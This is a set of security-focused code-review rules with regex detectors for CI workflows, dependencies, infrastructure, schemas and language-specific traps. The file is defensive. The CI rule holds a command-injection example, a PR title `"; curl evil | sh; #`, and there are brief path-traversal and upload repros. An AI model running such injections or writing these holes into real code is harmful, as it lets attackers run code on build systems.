# Language and file-type traps

Defect classes from OpenCodeReview's per-language checklists that the catalog does not name. The
`lpk:ocr` reviewers get the full checklists from `ocr delegate rule` at review time; these rules
put the literal ones on the line as it is written. Each loads only when a file of its kind
changes.

## Delivery

### ci-workflow-trust: a workflow never runs untrusted text or code with write access
- blocks: high
- when: path `(^|/)\.github/workflows/`
- rule: PR titles, bodies, branch names and commit messages never reach a `run:` script through `${{ }}`; they pass through `env:` and are quoted. `pull_request_target` never checks out or runs the PR's code. `permissions` is set per workflow or job to the least it needs, third-party actions are pinned to a commit SHA, and every job has `timeout-minutes`.
- check: for each workflow changed, list its trigger, its permissions and every `${{ github.* }}` inside `run:`. Repro: a PR title such as `"; curl evil | sh; #` and the line that would run it.
- find: `\$\{\{\s*github\.(event\.(?!repository\.)[\w.]*(title|body|message|name|label|ref)|head_ref)\b` in path `\.github/workflows/`
- find: `\bpull_request_target\b` in path `\.github/workflows/`
- find: `permissions:\s*write-all`

### dependency-pinned: a dependency names a version that cannot move under the build
- blocks: medium
- when: path `(^|/)(package\.json|Cargo\.toml|composer\.json|pom\.xml|build\.gradle(\.kts)?|requirements[^/]*\.txt|pyproject\.toml|go\.mod)$`
- rule: A new or changed dependency names a version or bounded range, never `latest`, `*`, a moving branch or a `-SNAPSHOT`, and the lockfile changes with it.
- check: for each dependency line added, the version it resolves to and the lockfile hunk that records it. Repro: the line and the lockfile with no matching entry.
- find: `"[\w@/.-]+"\s*:\s*"(latest|\*|x)"` in path `(^|/)(package|composer)\.json$`
- find: `-SNAPSHOT\b` in path `(^|/)(pom\.xml|build\.gradle(\.kts)?)$`
- find: `^\s*[\w-]+\s*=\s*"\*"` in path `(^|/)(Cargo|pyproject)\.toml$`

### iac-exposure: infrastructure is not opened to the world by default
- blocks: high
- when: path `\.(tf|tfvars|hcl|bicep)$|(^|/)(cloudformation|cdk|k8s|kubernetes|helm|charts)/`
- rule: No ingress from `0.0.0.0/0` or `::/0` except a public load balancer on 80/443, no IAM policy with `*` actions or resources, no state file or secret value in git, and `prevent_destroy` and deletion protection are never removed from stateful resources.
- check: for each resource changed, who can reach it and what the policy lets them do. Repro: the resource and the principal or address that gains access.
- find: `(?<![\d.])0\.0\.0\.0/0|(?<![\w:])::/0`
- find: `"(Action|Resource)"\s*:\s*"\*"`
- find: `prevent_destroy\s*=\s*false`

## Contracts

### schema-compat: a schema change keeps old clients and old rows working
- blocks: high
- when: path `\.(proto|graphql|gql|prisma|avsc|thrift)$|(^|/)openapi[^/]*\.(ya?ml|json)$`
- rule: A field number or tag is never reused or renumbered, a removed field is `reserved`, enum values are only appended, a nullable input never becomes required, and a new non-null column or field has a default, so every client and row built against the old schema still reads and writes.
- check: compare each changed message, type and model with the base. Repro: an old client's message or row and the error or wrong value it now gets.

## Language traps

### python-traps: Python's silent traps are absent
- blocks: medium
- when: path `\.pyi?$`
- rule: No mutable default argument, no bare `except:` (it catches `SystemExit` and `KeyboardInterrupt`), no `yaml.load` without a safe loader and no `pickle` on data from outside, no `is` against a literal, and no `assert` guarding input (it vanishes under `-O`).
- check: for each candidate, the call that shares the default or the input that reaches the loader. Repro: two calls that see each other's state, or the payload that runs code.
- find: `def \w+\([^)]*=\s*(\[\]|\{\}|set\(\)|dict\(\)|list\(\))` in path `\.pyi?$`
- find: `^\s*except\s*:` in path `\.pyi?$`
- find: `\byaml\.load\((?![^)]*Loader=yaml\.(Safe|CSafe)Loader)` in path `\.pyi?$`
- find: `\bpickle\.loads?\(` in path `\.pyi?$`

### go-traps: Go's lifecycle traps are absent
- blocks: medium
- when: path `\.go$`
- rule: No `defer` inside a loop that holds resources until the function returns, every `rows.Err()` and cancel function is checked or called, a mutex or `sync` value is never copied, and an error a caller must inspect is wrapped with `%w`, not flattened with `%v`.
- check: for each candidate, the caller that needs `errors.Is` or `errors.As`, or the loop that grows the deferred set. Repro: the call whose cause is lost or the resource still open after N iterations.
- find: `fmt\.Errorf\("[^"]*%v[^"]*"[^)]*\berr\)` in path `\.go$`

### js-traps: JavaScript's global traps are absent
- blocks: medium
- when: path `\.(m|c)?(j|t)sx?$`
- rule: No assignment to a built-in prototype, no `document.write`, no string passed to `setTimeout`, `setInterval` or `new Function`, and no React component declared inside another component (it remounts on every render and loses its state).
- check: for each candidate, what else on the page sees the change or what input reaches the string. Repro: the state that resets or the code that runs.
- find: `\b(Array|Object|String|Number|Function|Promise)\.prototype\.\w+\s*=` in path `\.(m|c)?(j|t)sx?$`
- find: `\bdocument\.write(ln)?\(` in path `\.(m|c)?(j|t)sx?$`
- find: `\b(setTimeout|setInterval)\(\s*['"`]` in path `\.(m|c)?(j|t)sx?$`

### rust-traps: Rust code does not panic or race where it can recover
- blocks: medium
- when: path `\.rs$`
- rule: No `unwrap` or `expect` on input, I/O or a lock outside tests and startup, no `static mut`, no `unsafe impl Send` or `Sync` without a written proof, and no synchronous lock guard held across `.await`.
- check: for each candidate, the input or failure that reaches it. Repro: the request that panics the worker or the two tasks that deadlock.
- find: `\bstatic\s+mut\b` in path `\.rs$`
- find: `\bunsafe\s+impl\b[^{]*\b(Send|Sync)\b` in path `\.rs$`

### c-unsafe-memory: C and C++ never write past a buffer
- blocks: high
- when: path `\.(c|h|cc|cpp|cxx|hpp|hh)$`
- rule: No unbounded string or format call (`strcpy`, `strcat`, `sprintf`, `gets`, `vsprintf`), every length used to copy is checked against the destination, and every allocation's size is checked for overflow.
- check: for each candidate, the largest input that reaches it and the destination's size. Repro: the input that overflows.
- find: `\b(strcpy|strcat|sprintf|vsprintf|gets)\s*\(` in path `\.(c|h|cc|cpp|cxx|hpp|hh)$`

### mobile-lifecycle: Swift and Kotlin work ends with its owner
- blocks: medium
- when: path `\.(swift|kt|kts)$`
- rule: An escaping closure captures `self` weakly (`[weak self]`, never `[unowned self]` where the owner can go first), a continuation resumes exactly once, and Kotlin work runs in a lifecycle scope, never `GlobalScope`.
- check: for each candidate, what holds the closure or coroutine and when its owner goes away. Repro: the screen closed while the work still runs or crashes.
- find: `\[unowned\s+self\]` in path `\.swift$`
- find: `\bGlobalScope\.(launch|async)\b` in path `\.kts?$`

### evm-contracts: a contract keeps funds safe from callers and callees
- blocks: high
- when: path `\.(sol|vy)$`
- rule: State is written before any external call (checks, effects, interactions), `tx.origin` never authorises, every low-level `.call` result is checked, `ecrecover` rejects the zero address, `abi.encodePacked` never hashes two dynamic values, and an oracle price is checked for staleness.
- check: for each external call, the state it can re-enter. Repro: the attacker contract and the balance it drains.
- find: `\btx\.origin\b` in path `\.(sol|vy)$`
- find: `\.delegatecall\(` in path `\.(sol|vy)$`
- find: `\becrecover\(` in path `\.(sol|vy)$`

## Inputs and trust

### upload-trust: an uploaded file is never trusted by its name or type
- blocks: high
- when: added `(multipart|upload|originalname|originalFilename|\$_FILES|MultipartFile|UploadFile|FormFile)`
- rule: The server names the stored file itself, checks its size and content type from the bytes, and resolves the destination inside the upload directory; the client's filename and MIME type are only shown, never used as a path or a type.
- check: for each upload path, where the filename and type go. Repro: an upload named `../../x` or a script sent as `image/png`.

### crypto-primitives: secrets are random, compared in constant time and hashed for passwords
- blocks: high
- when: added `\b(token|session|nonce|otp|salt|password|secret|api[_-]?key)\b`
- rule: Tokens, salts and nonces come from a cryptographic generator, secrets are compared in constant time, and passwords are hashed with a password hash (bcrypt, scrypt, argon2), never md5, sha1 or a plain sha256.
- check: for each new secret, the generator, the comparison and the hash. Repro: the generator call or the `==` on a secret.
